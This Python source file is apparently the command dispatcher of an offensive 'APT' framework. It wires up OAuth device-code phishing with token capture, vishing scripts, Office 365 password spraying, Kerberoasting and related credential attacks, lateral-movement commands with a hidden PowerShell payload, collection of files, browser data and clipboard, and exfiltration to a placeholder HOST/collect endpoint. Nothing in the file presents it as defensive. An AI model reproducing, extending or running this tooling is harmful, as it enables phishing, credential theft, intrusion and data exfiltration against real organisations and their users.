# language: Python 3.11+, file: cf/cmds_apt.py
# *apt modules — oauth access, creds, lateral, collection, exfil, opsec*
from __future__ import annotations

from pathlib import Path

from .cli_core import _num, err, ok, text
from .util import json_dumps, run_async


class AptCommands:
    """APT-module group — composed into Cli (cf.cli); self.pos/flags/store and
    the dispatch helpers (_need/_feature/_campaign/_base) live there."""

    def cmd_access(self) -> None:
        from .access import (
            AccessError,
            DeviceCodeFlow,
            authorize_url,
            vishing_script,
        )

        if len(self.pos) < 2:
            err("access devicecode|consent|vishing")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "devicecode":
            client_id = str(self.flags.get("client-id", ""))
            if not client_id:
                raise SystemExit("--client-id required (app registration)")
            flow = DeviceCodeFlow(
                client_id,
                tenant=str(self.flags.get("tenant", "common")),
                scopes=str(self.flags.get("scopes", "")) or "openid profile offline_access",
            )
            try:
                result = run_async(flow.run(timeout=float(self.flags.get("timeout", 900))))
            except AccessError as exc:
                err(str(exc))
                raise SystemExit(1) from None
            print(json_dumps({k: v for k, v in result.items() if k != "tokens"}))
            tokens = result.get("tokens", {})
            if tokens:
                ok("tokens captured")
                text(f"  access_token:  {str(tokens.get('access_token', ''))[:40]}…")
                text(f"  refresh_token: {str(tokens.get('refresh_token', ''))[:40]}…")
            return
        if sub == "consent":
            client_id = str(self.flags.get("client-id", ""))
            url = authorize_url(
                client_id,
                tenant=str(self.flags.get("tenant", "common")),
                redirect_uri=str(self.flags.get("redirect", "https://HOST/oauth/cf")),
                scopes=str(self.flags.get("scopes", "")) or "openid profile offline_access",
                state=str(self.flags.get("state", "cf")),
            )
            text(url)
            return
        if sub == "vishing":
            kind = self.pos[2] if len(self.pos) > 2 else "device_code"
            try:
                lines = vishing_script(
                    kind,
                    org=str(self.flags.get("org", "IT Service Desk")),
                    ticket=str(self.flags.get("ticket", "4821")),
                    code=str(self.flags.get("code", "")),
                    channel=str(self.flags.get("channel", "e-mail")),
                )
            except AccessError as exc:
                raise SystemExit(str(exc)) from None
            for i, line in enumerate(lines, 1):
                text(f"{i}. {line}")
            return
        err("access devicecode|consent|vishing")
        raise SystemExit(2)

    # ─── credential access ───


    def cmd_creds(self) -> None:
        from .creds import CredsError, generator, spray_o365

        if len(self.pos) < 2:
            err("creds spray|kerberoast|asrep|adcs|dpapi")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "spray":
            users_file = self.pos[2] if len(self.pos) > 2 else ""
            if not users_file:
                raise SystemExit("creds spray <users.txt> --password P [--tenant T]")
            path = Path(users_file)
            if not path.exists():
                raise SystemExit(f"users file not found: {users_file}")
            upns = [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]
            password = str(self.flags.get("password", ""))
            report = run_async(
                spray_o365(
                    upns,
                    password,
                    tenant=str(self.flags.get("tenant", "common")),
                    delay=_num(self.flags, "delay", 30, float),
                )
            )
            print(json_dumps({"outcomes": report.by_outcome(), "hits": report.hits(), "stopped": report.stopped}))
            if report.hits():
                ok(f"{len(report.hits())} valid credential(s)")
            return
        if sub in ("kerberoast", "asrep", "adcs", "dpapi"):
            try:
                out = generator(
                    sub,
                    target=str(self.flags.get("target", "HOST")),
                    domain=str(self.flags.get("domain", "corp.local")),
                    user=str(self.flags.get("user", "svc_account")),
                    **{"pass": str(self.flags.get("pass", "Password123!"))},
                    ca=str(self.flags.get("ca", "CORP-CA")),
                    template=str(self.flags.get("template", "Machine")),
                )
            except CredsError as exc:
                raise SystemExit(str(exc)) from None
            print(json_dumps(out))
            return
        err("creds spray|kerberoast|asrep|adcs|dpapi")
        raise SystemExit(2)

    # ─── lateral movement ───


    def cmd_lateral(self) -> None:
        from .lateral import KINDS, command

        if len(self.pos) < 2:
            err("lateral <kind> <host> [--user U] [--password P] [--domain D] [--payload C]")
            text(json_dumps(list(KINDS.keys())))
            raise SystemExit(2)
        kind = self.pos[1]
        host = self.pos[2] if len(self.pos) > 2 else ""
        if not host:
            raise SystemExit("lateral <kind> <host>")
        try:
            out = command(
                kind,
                host,
                user=str(self.flags.get("user", "Administrator")),
                password=str(self.flags.get("password", "Password123!")),
                domain=str(self.flags.get("domain", "CORP")),
                payload=str(self.flags.get("payload", "powershell -w h -nop -c whoami")),
                schedule_id=str(self.flags.get("schedule", "{00000000-0000-0000-0000-000000000001}")),
                gpo=str(self.flags.get("gpo", "Workstation Policy")),
                value=str(self.flags.get("value", "Updater")),
            )
        except KeyError as exc:
            raise SystemExit(str(exc.args[0])) from None
        print(json_dumps(out))

    # ─── collection ───


    def cmd_collect(self) -> None:
        from .collect import collector, list_kinds

        if len(self.pos) < 2:
            err("collect <screen|files|browser|clipboard|wifi>")
            text(json_dumps(list_kinds()))
            raise SystemExit(2)
        kind = self.pos[1]
        try:
            out = collector(
                kind,
                path=str(self.flags.get("path", "$env:USERPROFILE\\Documents")),
                limit=str(self.flags.get("limit", "20")),
            )
        except KeyError as exc:
            raise SystemExit(str(exc.args[0])) from None
        print(json_dumps(out))

    # ─── exfil ───


    def cmd_exfil(self) -> None:
        from .collect import exfil

        if len(self.pos) < 2:
            err("exfil <http|slack|rclone> [--url U] [--key K] [--path P]")
            raise SystemExit(2)
        kind = self.pos[1]
        try:
            out = exfil(
                kind,
                url=str(self.flags.get("url", "https://HOST/collect")),
                key=str(self.flags.get("key", "")),
                path=str(self.flags.get("path", "$env:TEMP\\staging.zip")),
            )
        except KeyError as exc:
            raise SystemExit(str(exc.args[0])) from None
        print(json_dumps(out))

    # ─── opsec preflight ───


    def cmd_opsec(self) -> None:
        from .opsec import format_checks, preflight, summary

        if len(self.pos) < 2 or self.pos[1] != "preflight":
            err("opsec preflight <url>")
            raise SystemExit(2)
        url = str(self.pos[2] if len(self.pos) > 2 else self.flags.get("url", ""))
        if not url:
            raise SystemExit("opsec preflight <url>")
        checks = run_async(preflight(url))
        text(format_checks(checks))
        print(json_dumps(summary(checks)))
        if any(not c.ok for c in checks):
            raise SystemExit(1)

    # ─── licensing ───
